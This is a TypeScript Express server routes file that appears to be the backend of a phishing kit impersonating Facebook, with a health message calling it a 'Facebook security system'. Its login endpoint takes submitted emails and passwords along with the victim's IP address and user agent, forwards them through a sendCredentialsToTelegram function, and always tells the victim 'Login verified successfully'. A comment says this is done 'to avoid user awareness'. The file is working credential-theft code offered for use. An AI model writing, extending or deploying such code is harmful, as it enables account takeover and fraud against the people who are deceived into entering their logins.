import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { sendCredentialsToTelegram } from "./telegram";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint for submitting credentials
  app.post('/api/auth/login', async (req: Request, res: Response) => {
    try {
      const { email, password } = req.body;
      
      if (!email || !password) {
        return res.status(400).json({ 
          success: false, 
          message: 'Email and password are required' 
        });
      }
      
      // Get client IP address
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
      
      // Get user agent
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      // Send credentials to Telegram
      await sendCredentialsToTelegram(email, password, String(ip), String(userAgent));
      
      // Return success even if Telegram message fails (to avoid user awareness)
      return res.status(200).json({ 
        success: true,
        message: 'Login verified successfully'
      });
    } catch (error) {
      console.error('Error processing login:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'Internal server error' 
      });
    }
  });

  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'Facebook security system running' });
  });

  const httpServer = createServer(app);

  return httpServer;
}
